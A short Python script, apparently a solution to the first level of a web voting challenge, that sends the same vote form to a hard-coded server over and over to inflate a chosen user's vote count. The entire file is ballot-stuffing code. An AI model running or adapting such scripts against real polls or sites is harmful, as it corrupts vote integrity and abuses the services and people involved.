#!/usr/bin/python3
import requests
from  functions import fetch_vote_count
import re

URL = "http://54.221.6.249/level0.php"
userid = input("Enter userid to vote for: ")
vote_limit = int(input("Enter number of times to vote: "))
payload = {
    'id': userid,
    'holdthedoor': 'Submit+Query'
}
start_votes = fetch_vote_count(userid, URL)
print("Votes before run: {:s}".format(start_votes))
print("Voting {:d} times".format(vote_limit))

for i in range(0,vote_limit):
    print(i+1)
    r = requests.post(URL, data=payload)

end_votes = fetch_vote_count(userid, URL)
votes_cast = int(end_votes) - int(start_votes)
print("Votes cast: {:d}".format(votes_cast))
